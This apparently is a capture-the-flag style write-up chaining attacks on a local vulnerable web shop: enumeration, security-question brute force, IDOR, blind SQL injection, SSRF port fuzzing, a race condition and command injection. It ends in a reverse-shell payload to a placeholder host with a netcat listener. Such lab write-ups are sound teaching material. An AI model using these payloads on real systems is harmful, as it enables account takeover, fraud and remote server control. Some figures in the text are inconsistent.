# VRWA Write-Up: Chained Exploit

### Phase 1: Initial Foothold via Account Takeover (`frank`)

The first objective was to gain access to any user account on the platform. This was achieved by exploiting a weak password reset mechanism that was vulnerable to both username enumeration and brute-force attacks.

#### Step 1.1: Username Enumeration
The password reset page was identified as a vector for username enumeration. The application's response to a password reset request for an invalid username differed from the response for a valid one. This allowed for the confirmation of valid usernames without authentication.

* **Method:** Using the tool `ffuf`, the raw HTTP request for a password reset was saved to a file (`request.txt`). The target username was replaced with the `FUZZ` keyword. `ffuf` automated the process of testing a wordlist of common usernames against the endpoint.
* **Result:** The user `frank` was identified as a valid account. It was also noted that usernames were publicly visible in the product comments section, providing an alternative, passive enumeration method.

#### Step 1.2: Brute-Forcing the Security Question
With a valid username (`frank`), the password reset process presented a security question: "What is your first pet's name?". This type of knowledge-based authentication is inherently weak.

* **Method:** Using Burp Intruter, the request to submit the security answer was attacked. A wordlist of common pet names was used as the payload.
* **Result:** The attack quickly revealed that the correct answer was `max`. This allowed for the password to be reset, granting full control over the `frank` account.

---

### Phase 2: Price Manipulation and Information Disclosure

Once authenticated as `frank`, a critical business logic flaw was discovered in the shopping cart functionality.

#### Step 2.1: Exploiting Integer Underflow
The application failed to properly validate the quantity of items being removed from the cart, permitting a negative quantity and, consequently, a negative price.

1.  An expensive item ("Amiga 500" at **$699.00**) and a cheap item were added to the cart.
2.  The `POST /cart` request to decrease the quantity of the *cheap* item was intercepted.
3.  The `quantity` parameter in the request was modified from `1` to `10`.
4.  The server processed this request, setting the cheap item's quantity to `-9`. This resulted in a large negative value being subtracted from the total cart price, making the expensive "Amiga 500" affordable.

#### Step 2.2: Information Disclosure
Upon completing the manipulated purchase, the confirmation page displayed a "fun fact" that leaked sensitive internal information.

> "the entire shopping system for this website was developed by the user **customer35** on the amiga 500. Isn't that cool?"

This message disclosed the username `customer35`, which was presumed to be a high-privilege or developer account and became the next target.

---

### Phase 3: Privilege Escalation to Developer Account (`customer35`)

The goal was to take over the `customer35` account. The external password reset was not an option, as the security question was randomized. However, an Insecure Direct Object Reference (IDOR) vulnerability was found in the authenticated user profile area.

#### Step 3.1: Exploiting IDOR in Password Update
The internal password change function at `POST /user` included a `uid` parameter containing the Base64-encoded username of the currently logged-in user. The application failed to validate that the user making the request was the same user identified in the `uid` parameter.

* **Attack:** By replacing the `uid` value for `frank` (`ZnJhbms=`) with the Base64-encoded string for `customer35` (`Y3VzdG9tZXIzNQ==`), it was possible to change the target's password while authenticated as a low-privilege user.

* **Modified Request:**
    ```http
    POST /user HTTP/1.1
    Host: 127.0.0.1:8080
    Cookie: session=eyJ1c2VybmFtZSI6ImZyYW5rIn0...

    current_password=1234&new_password=letmein&confirm_password=letmein&uid=Y3VzdG9tZXIzNQ==&change_password=true
    ```
Sending this request successfully changed the password for `customer35`, allowing a full account takeover.

---

### Phase 4: Gaining Administrative Access

After logging in as `customer35`, new developer-specific functionalities were visible, but they were protected by a `dev_code`. An error message pointed towards an admin who could reset this code, making access to the admin panel the next objective.

#### Step 4.1: Admin Panel Discovery
The `robots.txt` file revealed a disallowed administrative path: `/Adm1n_l091n`. The discovered admin panel was protected against standard brute-force attacks.

#### Step 4.2: Blind Boolean-Based SQL Injection
Further investigation revealed an API endpoint at `POST /login/check` where the `id` parameter was vulnerable to SQL Injection. Since the endpoint only returned "True" or "False", a blind boolean-based technique was used to extract information from the database.

1.  **Enumerating Database Structure:** First, simple queries were injected to confirm the existence of tables and users. The server returning "True" confirmed the query was valid.
    * Confirm `admins` table exists: `id=9984 AND (SELECT COUNT(*) FROM admins WHERE name = 'admin') > 0--`

2.  **Automated Extraction with Burp Intruder:** To extract the full password efficiently, a **Cluster Bomb** attack was configured in Burp Intruder.
    * **Payload Markers:** Two payload markers (`§`) were set in the request. The first marker indicates the character's position in the password string, and the second indicates the character to guess.
        ```sql
        id=9984 AND (SELECT SUBSTRING(password,§1§,1) FROM admins WHERE name='admin')='§a§' --
        ```
    * **Payload Sets:**
        * Payload Set 1 (Position): A list of numbers (e.g., 1 to 20).
        * Payload Set 2 (Character): A list of characters (`a-z`, `0-9`, special characters).
    * **Grep-Match:** A Grep-Match rule was configured to flag any response containing the string "True", immediately identifying a correct character guess for a given position.

3.  **Result:** The Intruder attack successfully extracted the admin password. With the recovered credentials, we logged into the admin panel and reset the `dev_code` for the `customer35` account.

---

### Phase 5: Internal API Compromise via SSRF

Leveraging the developer privileges of the `customer35` account, the next step was to pivot from the public-facing application to internal, hidden network services.

#### Step 5.1: SSRF Discovery and Port Fuzzing
When adding an item to the cart, intercepting the request revealed a `stockapi` parameter containing a URL.

* **Decoded Parameter:** `http://127.0.0.1:8200/checkstock?item_id=2`

This immediately indicated a potential **Server-Side Request Forgery (SSRF)** vulnerability. The server was making a request to an internal address (`127.0.0.1`) specified by the client. The primary goal became using this vulnerability to perform reconnaissance on the internal network by systematically scanning, or **fuzzing**, the ports on the local machine to discover other running services.

* **Method:**
    1.  The request was sent to **Burp Intruder**.
    2.  The port number (`8200`) in the `stockapi` parameter was marked as the payload position: `stockapi=http://127.0.0.1:§8200§`.
    3.  A payload list of numbers (e.g., 1-10000) was configured to test each port.
    4.  The attack was launched, monitoring the HTTP response codes and lengths to identify open ports.

* **Result:** The fuzzing attack revealed an active service on a non-standard port. The request to this port returned a unique response, confirming the discovery of a hidden endpoint.

* **Example of a Successful Discovery:**
    The following request to port `6886` and its corresponding response confirmed an active developer service:

    **Request:**
    ```http
    POST /product?id=2 HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=eyJ1c2VybmFtZSI6ImN1c3RvbWVyMzUifQ...
    Content-Length: 30

    stockapi=[http://127.0.0.1:6886](http://127.0.0.1:6886)
    ```
    **Response:**
    ```http
    HTTP/1.1 200 OK
    Server: Werkzeug/3.1.3 Python/3.9.23
    Content-Type: text/html; charset=utf-8
    Content-Length: 131

    Welcome. Please be advised that this area is for authorized Development Team personnel. Unauthorized access is strictly prohibited.
    ```
This successful scan led to the identification of the target URL: `http://127.0.0.1:6886/internal_Dev_api`.

#### Step 5.2: Accessing the Quantum Computer
Navigating to the discovered API revealed a product page for a quantum computer priced at **$15,000,000**. The "buy" button led to an endpoint (`/quantum/add_cart`) that required a valid `dev_token`.

1.  Logged in as `customer35`, we used the `dev_code` (reset in Phase 4) to generate a valid `dev_token`.
2.  The `dev_token` was submitted to the `/quantum/add_cart` endpoint, successfully adding the high-value "Quantum Computer" item to the cart.
---

### Phase 6: Financial Exploitation via Race Condition

The quantum computer was in the cart, but `customer35` lacked the $15M needed for the purchase. The platform's fund transfer system was the next target.

#### Step 6.1: Identifying Transfer Limitations
The fund transfer system had two key restrictions:
1.  A transfer was capped at a maximum of **$20,000**.
2.  A user could only send funds to another specific user **once**.
3.  A user could not transfer funds to their own account.

To bypass these limitations, a second developer account was required to exploit a race condition.

#### Step 6.2: Acquiring a Second Developer Account (`carlos`)
Reusing previously gained access, we acquired control of another developer account.
1.  Logged back into the admin panel (`/Adm1n_l091n`) using the credentials from Phase 4.
2.  Identified another developer user named `carlos`.
3.  Reset the `dev_code` for `carlos` via the admin panel.
4.  Used the IDOR vulnerability from Phase 3 to change `carlos`'s password. This gave us full control over two developer accounts: `customer35` and `carlos`.

#### Step 6.3: Executing the Race Condition Attack
The "send funds once" check was vulnerable to a race condition. By sending multiple requests in parallel, it's possible to process several transfers before the application can update its state to block subsequent attempts.

* **Method:**
    1.  Logged in as `carlos` and crafted a request to send the maximum amount ($200,000) to `customer35`.
    2.  Sent this request to Burp Repeater and duplicated the tab ~100 times.
    3.  Created a tab group and used the "Send requests in parallel" feature to fire all transfer requests simultaneously.
* **Result:** The attack was successful. The application processed dozens of transfers before the lock took effect, crediting `customer35`'s account with well over the required $15M. With sufficient funds, we logged in as `customer35` and completed the purchase of the quantum computer.

---

### Phase 7: Gaining Server Control via OS Command Injection

The final phase began after the purchase was complete, revealing a new, privileged functionality.

#### Step 7.1: Discovering the New Attack Surface
Upon visiting the user page as `customer35`, a new button appeared: "Manage Quantum Computer". This led to a diagnostic panel with a `ping` utility designed to check the computer's connectivity.

#### Step 7.2: Identifying the Command Injection Vulnerability
The input field for the ping utility was intended to accept an IP address. However, it lacked proper input sanitization, making it vulnerable to OS Command Injection. The server would execute any shell command appended to a valid IP address.

#### Step 7.3: Crafting the Reverse Shell Payload
To gain interactive control over the server, a reverse shell payload was crafted.

* **Attacker Machine:** First, a listener was set up on our machine using netcat to catch the incoming connection.
    ```bash
    nc -lvnp 4444
    ```

* **Injected Payload:** The following payload was entered into the ping utility's input box.
    ```bash
    8.8.8.8 & bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1
    ```
    * `8.8.8.8 &`: A valid IP address to satisfy the ping command, followed by `&` to execute the next command.
    * `bash -i >& ...`: A standard one-liner that initiates an interactive bash shell (`-i`) and redirects all its input, output, and error streams (`>&`) over the network to our listener's IP and port.

#### Step 7.4: Capturing the Shell
Upon submitting the payload, the server executed the command. A connection was immediately received by our netcat listener, granting a full interactive shell and complete control over the target server. 